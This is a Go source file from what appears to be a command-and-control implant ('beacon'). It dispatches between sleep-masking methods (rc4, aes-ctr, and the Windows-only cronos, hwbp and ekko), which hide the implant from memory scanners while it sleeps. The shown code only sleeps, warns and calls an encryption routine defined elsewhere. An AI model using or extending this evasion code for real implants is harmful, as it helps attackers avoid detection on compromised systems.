//go:build linux

package evasion

import (
    "fmt"
    "sync"
    "time"
)

// linuxMaskWarnOnce gates the one-time warning for mask types that
// are not implemented on Linux at all.
var linuxMaskWarnOnce sync.Once

// MaskedSleep dispatches on the mask type. The rc4 and aes-ctr
// masks are implemented on linux/amd64; see sleepmask_linux_amd64.go.
// The Windows-only masks (cronos, hwbp, ekko) fall through to a
// plain sleep with a one-time warning. Any other value also falls
// through with a warning.
//
// The sleep always happens for the full requested duration, in every
// branch. A function that returns without sleeping causes the
// beacon's run loop to busy-spin, which is worse than a weak mask.
func MaskedSleep(maskType string, ms uint32) error {
    switch maskType {
    case "", "none":
        time.Sleep(time.Duration(ms) * time.Millisecond)
        return nil
    case "rc4", "aes-ctr":
        return maskedSleepBasicLinux(maskType, ms)
    case "cronos", "hwbp", "ekko":
        linuxMaskWarnOnce.Do(func() {
            fmt.Printf("[evasion] sleep mask %q is Windows-only; "+
                "continuing with a plain sleep. Use 'rc4' or "+
                "'aes-ctr' on Linux.\n", maskType)
        })
        time.Sleep(time.Duration(ms) * time.Millisecond)
        return nil
    default:
        linuxMaskWarnOnce.Do(func() {
            fmt.Printf("[evasion] unknown sleep mask %q; "+
                "continuing without a mask.\n", maskType)
        })
        time.Sleep(time.Duration(ms) * time.Millisecond)
        return nil
    }
}